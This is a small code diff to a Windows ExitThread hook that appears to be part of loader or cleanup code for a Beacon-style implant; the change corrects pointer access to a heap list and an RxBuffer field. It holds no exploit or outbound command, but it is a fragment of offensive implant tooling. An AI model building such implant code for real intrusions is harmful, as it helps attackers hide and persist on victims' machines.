@@ -75,8 +75,8 @@ D_SEC( D ) VOID WINAPI ExitThread_Hook( _In_ DWORD ExitCode )
 	};
 
 	/* Get pointer to the table address */
-	Tbl = C_PTR( *( PVOID * )( G_SYM( Table ) ) );
-	Hdr = C_PTR( & Tbl->HeapList );
+	Tbl = C_PTR( G_SYM( Table ) );
+	Hdr = C_PTR( & Tbl->Table->HeapList );
 	Ent = C_PTR( Hdr->Flink );
 
 	/* Enumerate heap entries */
@@ -89,7 +89,7 @@ D_SEC( D ) VOID WINAPI ExitThread_Hook( _In_ DWORD ExitCode )
 	};
 
 	/* Free the memory allocated by Beacon */
-	Img = Tbl->RxBuffer;
+	Img = Tbl->Table->RxBuffer;
 	Len = 0;
 
 	/* Acquire the current frame address */
